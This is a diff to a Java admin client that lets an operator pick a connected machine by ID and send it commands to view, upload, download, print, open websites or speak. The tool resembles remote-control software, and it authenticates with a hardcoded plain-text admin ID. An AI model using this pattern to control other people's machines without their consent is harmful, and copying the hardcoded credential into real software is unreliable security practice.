@@ -1,5 +1,6 @@
 package AdminClient;
 
+import Client.Client;
 import Client.Networking.ClientNetworkHandler;
 import NetworkUtils.NetworkUtil;
 import NetworkUtils.Packet;
@@ -7,6 +8,9 @@ import NetworkUtils.PacketHandler;
 import NetworkUtils.Packets.AdminIDPacket;
 import NetworkUtils.Packets.PrintPacket;
 import NetworkUtils.Packets.AdminCommandPacket;
+import Server.Networking.ServerClient;
+import Server.Networking.ServerNetworkHandler;
+import Server.Server;
 
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
@@ -21,9 +25,9 @@ public class AdminClient {
     private static PacketHandler packetHandler;
 
     public static void run() {
+        System.out.println("Running admin client!");
         networkHandler = new ClientNetworkHandler();
 
-        // Init connection
         while (true) {
             if (!networkHandler.connect(NetworkUtil.port, NetworkUtil.serverDDNS)) {
                 System.out.println("Connection failed. Attempting to reconnect...");
@@ -39,11 +43,9 @@ public class AdminClient {
         System.out.println("Established a connection!");
         packetHandler = new PacketHandler(networkHandler.getConnection());
 
-        // Send Admin ID to the server for verification
         String adminID = "Winston smells";
         networkHandler.getConnection().sendPacket(new AdminIDPacket(adminID));
 
-        // Start CLI loop for sending commands
         startAdminCLI();
     }
 
@@ -56,13 +58,80 @@ public class AdminClient {
                 String command = reader.readLine().trim();
                 if (command.isEmpty()) continue;
 
-                // Send the command to the server
-                AdminCommandPacket adminCommandPacket = new AdminCommandPacket(command);
-                networkHandler.getConnection().sendPacket(adminCommandPacket);
-                System.out.println("Command sent to server: " + command);
+                processCommand(command);
             } catch (Exception e) {
                 e.printStackTrace();
             }
+        }
+    }
+
+    public static void processCommand(String input) {
+        String[] parts = input.split(" ", 2);
+        String command = parts[0].toLowerCase();
+        String arguments = parts.length > 1 ? parts[1] : "";
+
+        if (command.equals("use") && arguments.length() > 0) {
+            useClientById(arguments);
+            return;
+        }
+
+        if (Server.getSelectedClient() == null) {
+            System.out.println("No client selected. Use 'use <clientID>' to select a client.");
+            return;
+        }
+
+        switch (command) {
+            case "view":
+                sendCommandToSelectedClient(new AdminCommandPacket("view"));
+                break;
+            case "change":
+                sendCommandToSelectedClient(new AdminCommandPacket("change " + arguments));
+                break;
+            case "upload":
+                sendCommandToSelectedClient(new AdminCommandPacket("upload " + arguments));
+                break;
+            case "download":
+                sendCommandToSelectedClient(new AdminCommandPacket("download " + arguments));
+                break;
+            case "print":
+                sendCommandToSelectedClient(new AdminCommandPacket("print " + arguments));
+                break;
+            case "website":
+                sendCommandToSelectedClient(new AdminCommandPacket("website " + arguments));
+                break;
+            case "speak":
+                sendCommandToSelectedClient(new AdminCommandPacket("speak " + arguments));
+                break;
+            case "listconnectedclients":
+                sendCommandToSelectedClient(new AdminCommandPacket("listconnectedclients"));
+                break;
+            default:
+                System.out.println("Unknown command! Try again.");
+                break;
+        }
+    }
+
+    public static void sendCommandToSelectedClient(AdminCommandPacket packet) {
+        if (Server.getSelectedClient() != null) {
+            Server.getSelectedClient().getConnection().sendPacket(packet);
+            System.out.println("Command sent to selected client: " + packet.getCommand());
+        } else {
+            System.out.println("No client selected to send the command to.");
+        }
+    }
+
+    public static void useClientById(String clientIdStr) {
+        try {
+            int clientId = Integer.parseInt(clientIdStr);
+            ServerClient client = ServerNetworkHandler.getClientById(clientId);
+            if (client != null) {
+                Server.setSelectedClient(client);
+                System.out.println("Client with ID " + clientId + " selected.");
+            } else {
+                System.out.println("No client found with ID: " + clientId);
+            }
+        } catch (NumberFormatException e) {
+            System.out.println("Invalid client ID format.");
         }
     }
 
